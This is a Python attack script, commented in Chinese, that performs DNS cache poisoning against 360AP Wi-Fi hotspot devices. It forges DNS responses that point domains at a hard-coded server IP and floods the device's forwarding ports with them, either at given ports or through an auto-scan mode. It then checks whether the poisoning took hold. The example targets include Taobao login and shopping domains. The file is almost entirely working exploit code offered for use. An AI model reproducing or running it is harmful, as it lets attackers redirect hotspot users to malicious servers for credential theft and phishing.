# -*- coding: utf-8 -*-
"""360AP DNS 缓存投毒 — 通用版

用法:
  python attack.py -t 172.16.69.1 -p 62502 -q 65222 -d neverssl.com
  python attack.py -t 192.168.253.1 -p 54295 -d cart.taobao.com

如果不指定端口，用 --scan 自动扫描转发端口。
"""

import socket, struct, time, sys, argparse

# 投毒目标 IP (你的服务器) — 不用改
FAKE_IP = '97.107.130.225'


def q(domain, txid):
    pkt = struct.pack('>HHHHHH', txid & 0xFFFF, 0x0100, 1, 0, 0, 0)
    for label in domain.encode().split(b'.'):
        pkt += bytes([len(label)]) + label
    return pkt + b'\x00' + struct.pack('>HH', 1, 1)


def psn(txid, domain):
    r = struct.pack('>HHHHHH', txid & 0xFFFF, 0x8580, 1, 1, 0, 0)
    for label in domain.encode().split(b'.'):
        r += bytes([len(label)]) + label
    r += b'\x00' + struct.pack('>HH', 1, 1)
    r += b'\xc0\x0c' + struct.pack('>HHIH', 1, 1, 9999, 4)
    return r + socket.inet_aton(FAKE_IP)


def resolve(target, domain):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.sendto(q(domain, 0x1337), (target, 53))
        r, _ = s.recvfrom(4096)
        s.close()
        if socket.inet_aton(FAKE_IP) in r:
            return 'POISONED'
        an = struct.unpack('>H', r[6:8])[0]
        return socket.inet_ntoa(r[-4:]) if an > 0 and len(r) >= 16 else 'NX'
    except:
        return None


def scan_fwd_port(target, domain):
    """自动发现转发端口 — 用真实域名列表确保解析慢、竞态窗口大"""
    # 有CNAME链的真实域名，解析需要两次查询，比野域名慢得多
    domains = [
        'cart.taobao.com', 'item.taobao.com', 's.taobao.com',
        'world.taobao.com', 'guang.taobao.com', 'new.taobao.com',
        'h5.m.taobao.com', 'login.taobao.com', 'ai.taobao.com',
        'www.tmall.com', 'ju.taobao.com', 'we.taobao.com',
        'qiang.taobao.com', 'tejia.taobao.com', 'uland.taobao.com',
    ]

    print(f'[*] 扫描转发端口 49152-65535 ...')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.3)

    for batch, lo in enumerate(range(49152, 65536, 1000)):
        hi = min(lo + 1000, 65536)
        d = domains[batch % len(domains)]
        tx = 0x4000 + batch

        s.sendto(q(d, tx), (target, 53))
        pkt = psn(tx, d)
        for p in range(lo, hi):
            if p not in (53, 67, 68):
                s.sendto(pkt, (target, p))

        time.sleep(0.1)

        if resolve(target, d) == 'POISONED':
            print(f'[+] 命中! 端口 {lo}-{hi} ({d})')
            s.close()
            return list(range(lo, hi))

        if batch % 5 == 0:
            print(f'    {lo}-{hi} ({d})')

    s.close()
    return None


def attack(target, ports, domain):
    print(f'[*] 目标: {target}')
    print(f'[*] 域名: {domain}')
    print(f'[*] 端口: {", ".join(map(str, ports))}')
    print(f'[*] 假 IP: {FAKE_IP}')
    print()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.5)

    for tx in range(0x4000, 0x4400, 0x10):
        s.sendto(q(domain, tx), (target, 53))
        pkt = psn(tx, domain)
        for p in ports:
            s.sendto(pkt, (target, p))

    time.sleep(0.5)

    for _ in range(5):
        s.sendto(q(domain, 0x5000), (target, 53))
        try:
            r, _ = s.recvfrom(4096)
            if socket.inet_aton(FAKE_IP) in r:
                print(f'✅ {domain} -> {FAKE_IP}')
                print(f'   nslookup {domain} {target}')
                s.close()
                return True
        except:
            pass

    print('❌ 失败')
    s.close()
    return False


def main():
    parser = argparse.ArgumentParser(
        description='360AP DNS 缓存投毒',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python attack.py -t 172.16.69.1 -p 62502 -d neverssl.com
  python attack.py -t 192.168.253.1 -p 54295 -q 57818 -d cart.taobao.com
  python attack.py -t 172.16.69.1 --scan -d jbzs.12321.cn
        """
    )
    parser.add_argument('-t', '--target', required=True,
                        help='360AP 热点 IP (如 172.16.69.1)')
    parser.add_argument('-p', '--port', type=int, action='append',
                        help='转发端口 (可多次指定, 如 -p 62502 -p 65222)')
    parser.add_argument('-q', '--port2', type=int, action='append',
                        help='同 -p')
    parser.add_argument('-d', '--domain', default='neverssl.com',
                        help='投毒域名 (默认: neverssl.com)')
    parser.add_argument('--scan', action='store_true',
                        help='自动扫描转发端口')
    args = parser.parse_args()

    # 收集端口
    ports = []
    if args.port:
        ports.extend(args.port)
    if args.port2:
        ports.extend(args.port2)

    if not ports and not args.scan:
        parser.error('请指定 -p 端口 或 --scan 自动扫描')

    if args.scan:
        ports = scan_fwd_port(args.target, args.domain)
        if ports:
            print(f'\n[+] 端口: {ports}, 投毒 {args.domain} ...')
            attack(args.target, ports, args.domain)
        else:
            print('\n[-] 扫描未命中，建议在本机用 netstat 查转发端口')
        return

    # 检查 DNS 连通性
    r = resolve(args.target, 'www.baidu.com')
    if r is None:
        print(f'[!] {args.target}:53 不通')
        sys.exit(1)
    print(f'[+] DNS 正常 (www.baidu.com -> {r})')

    attack(args.target, ports, args.domain)


if __name__ == '__main__':
    main()
